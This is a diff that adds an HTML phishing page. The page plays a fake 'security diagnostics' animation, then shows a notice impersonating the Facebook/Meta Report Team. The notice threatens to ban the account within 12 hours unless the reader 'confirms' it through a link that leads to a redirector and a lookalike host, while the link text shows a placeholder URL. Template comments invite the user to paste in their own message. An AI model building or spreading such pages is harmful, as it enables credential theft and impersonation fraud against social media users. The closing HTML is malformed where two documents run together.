@@ -1,6 +1,259 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Verification & Diagnostic Portal</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: #0d1117;
+      color: #c9d1d9;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 16px;
+      padding: 30px;
+      max-width: 520px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.7);
+    }
+
+    /* 1. Multi-Color Rotating Lines V Circle Logo */
+    .v-logo-wrapper {
+      position: relative;
+      width: 90px;
+      height: 90px;
+      margin: 0 auto 25px auto;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .v-logo-wrapper::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      padding: 4px;
+      background: conic-gradient(#ff0000, #0055ff, #00ff66, #ffffff, #ff0000);
+      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: xor;
+      mask-composite: exclude;
+      animation: rotateRing 2.5s linear infinite;
+    }
+
+    @keyframes rotateRing {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .v-circle-inner {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      background: #0d1117;
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 36px;
+      font-weight: 900;
+      text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+    }
+
+    /* 2. Security Terminal (11 Steps) */
+    .terminal-box {
+      background: #090d11;
+      border: 1px solid #21262d;
+      border-radius: 8px;
+      padding: 15px;
+      height: 230px;
+      overflow-y: auto;
+      text-align: left;
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 13px;
+      margin-bottom: 20px;
+    }
+
+    .step-item {
+      margin-bottom: 8px;
+      opacity: 0;
+      transform: translateY(5px);
+      animation: fadeIn 0.3s forwards;
+    }
+
+    .step-item.success { color: #3fb950; }
+    .step-item.warning { color: #d29922; }
+    .step-item.info { color: #58a6ff; }
+
+    @keyframes fadeIn {
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* 3. Text Link (Process Completion) */
+    .next-text-container {
+      display: none;
+      margin-top: 15px;
+    }
+
+    .action-text-link {
+      color: #58a6ff;
+      font-size: 16px;
+      font-weight: 600;
+      text-decoration: underline;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+
+    .action-text-link:hover {
+      color: #79c0ff;
+    }
+
+    /* 4. Full Message Overlay Window */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.88);
+      backdrop-filter: blur(6px);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .modal-content {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 12px;
+      padding: 30px;
+      max-width: 650px;
+      width: 100%;
+      max-height: 85vh;
+      overflow-y: auto;
+      text-align: left;
+      color: #c9d1d9;
+      line-height: 1.7;
+    }
+
+    .modal-content h3 {
+      color: #f0f6fc;
+      margin-bottom: 15px;
+      border-bottom: 1px solid #30363d;
+      padding-bottom: 10px;
+      font-size: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    
+    <!-- Multi-color Animated V Logo -->
+    <div class="v-logo-wrapper">
+      <div class="v-circle-inner">V</div>
+    </div>
+
+    <h2 style="font-size: 18px; margin-bottom: 15px; color: #f0f6fc;">System Security Diagnostics</h2>
+
+    <!-- 11 Steps Security Terminal -->
+    <div class="terminal-box" id="terminal"></div>
+
+    <!-- Next Process Text Link -->
+    <div class="next-text-container" id="nextLinkWrapper">
+      <span class="action-text-link" onclick="openMessageModal()">Next Process Complete Karein</span>
+    </div>
+
+  </div>
+
+  <!-- Full Message Pop-Up Window -->
+  <div class="modal-overlay" id="messageModal">
+    <div class="modal-content">
+      <h3>Official Notice</h3>
+      
+      
+      <div id="userMessageContainer">
+        
+        <p>⚠️𝐘𝐨𝐮𝐫 𝐩𝐚𝐠𝐞 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐝𝐢𝐬𝐚𝐛𝐥𝐞𝐝 𝐛𝐞𝐜𝐚𝐮𝐬𝐞 ⚠️𝐬𝐨𝐦𝐞𝐨𝐧𝐞 𝐡𝐚𝐬 𝐫𝐞𝐩𝐨𝐫𝐭𝐞𝐝 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐧𝐨𝐭 𝐜𝐨𝐦𝐩𝐥𝐲𝐢𝐧𝐠 𝐰𝐢𝐭𝐡 𝐭𝐡𝐞 𝐭𝐞𝐫𝐦𝐬 𝐨𝐟 𝐬𝐞𝐫𝐯𝐢𝐜𝐞.
+𝐈𝐟 𝐲𝐨𝐮 𝐛𝐞𝐥𝐢𝐞𝐯𝐞 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐚𝐬 𝐫𝐞𝐩𝐨𝐫𝐭𝐞𝐝 𝐛𝐲 𝐦𝐢𝐬𝐭𝐚𝐤𝐞,𝐫𝐞-𝐯𝐞𝐫𝐢𝐟𝐲 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐭𝐨 𝐚𝐯𝐨𝐢𝐝 𝐠𝐞𝐭𝐭𝐢𝐧𝐠 𝐛𝐚𝐧𝐧𝐞𝐝.
+
+𝐂𝐨𝐧𝐟𝐢𝐫𝐦 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐞𝐫𝐞
+<a href="https://redria.netlify.app/?u=https://primal-cat-2660.confirm-review-requst.deno.net" target="_blank" style="color: #38bdf8; text-decoration: underline; font-weight: bold;">https://aapki-link-yahan.com</a>
+          
+𝐈𝐟 𝐲𝐨𝐮 𝐝𝐨 𝐧𝐨𝐭 𝐜𝐨𝐧𝐟𝐢𝐫𝐦 𝐰𝐢𝐭𝐡𝐢𝐧 𝟏𝟐 𝐡𝐨𝐮𝐫𝐬,𝐨𝐮𝐫 𝐬𝐲𝐬𝐭𝐞𝐦 𝐰𝐢𝐥𝐥 𝐚𝐮𝐭𝐨𝐦𝐚𝐭𝐢𝐜𝐚𝐥𝐥𝐲 𝐛𝐥𝐨𝐜𝐤 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐚𝐧𝐝 𝐲𝐨𝐮 𝐰𝐢𝐥𝐥 𝐧𝐨𝐭 𝐛𝐞 𝐚𝐛𝐥𝐞 𝐭𝐨 𝐮𝐬𝐞 𝐢𝐭.
+𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐡𝐞𝐥𝐩𝐢𝐧𝐠 𝐮𝐬 𝐢𝐦𝐩𝐫𝐨𝐯𝐞 𝐭𝐡𝐞 𝐌𝐄𝐓𝐀 𝐒𝐞𝐫𝐯𝐢𝐜𝐞 𝐒𝐲𝐬𝐭𝐞𝐦.
+𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 𝐑𝐞𝐩𝐨𝐫𝐭 𝐓𝐞𝐚𝐦 ©️ 𝟐𝟎𝟐6
+𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤 𝐌𝐞𝐭𝐚 ©️ 𝟐𝟎𝟐6.</p>
+
+        <!-- BUS IS LINE KE UPAR TAK PASTE KAREIN -->
+
+      </div>
+      <!-- ==================== AAPKA MESSAGE AREA (END) ====================== -->
+
+    </div>
+  </div>
+
+  <script>
+    // 11 Security & Violation Steps
+    const securitySteps = [
+      { text: "[1/11] Initializing browser environment scan...", type: "info" },
+      { text: "[2/11] Checking SSL/TLS protocol integrity...", type: "info" },
+      { text: "[3/11] Analyzing network headers for policy violations...", type: "warning" },
+      { text: "[4/11] Scanning session tokens and security cookies...", type: "info" },
+      { text: "[5/11] Checking IP reputation and access parameters...", type: "info" },
+      { text: "[6/11] Verifying user-agent compliance...", type: "info" },
+      { text: "[7/11] Detecting potential script cross-site violations...", type: "warning" },
+      { text: "[8/11] Validating system hardware fingerprint...", type: "info" },
+      { text: "[9/11] Evaluating system security policy adherence...", type: "info" },
+      { text: "[10/11] Violation clearance verification complete.", type: "success" },
+      { text: "[11/11] All security diagnostics passed successfully.", type: "success" }
+    ];
+
+    const terminal = document.getElementById("terminal");
+    const nextLinkWrapper = document.getElementById("nextLinkWrapper");
+    let currentStep = 0;
+
+    function runSecuritySteps() {
+      if (currentStep < securitySteps.length) {
+        const step = securitySteps[currentStep];
+        const div = document.createElement("div");
+        div.className = `step-item ${step.type}`;
+        div.textContent = step.text;
+        terminal.appendChild(div);
+        terminal.scrollTop = terminal.scrollHeight;
+        currentStep++;
+        setTimeout(runSecuritySteps, 500);
+      } else {
+        nextLinkWrapper.style.display = "block";
+      }
+    }
+
+    function openMessageModal() {
+      document.getElementById("messageModal").style.display = "flex";
+    }
+
+    window.onload = runSecuritySteps;
+  </script>
+
+</body>
+</html<!DOCTYPE html>
+<html lang="en">
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
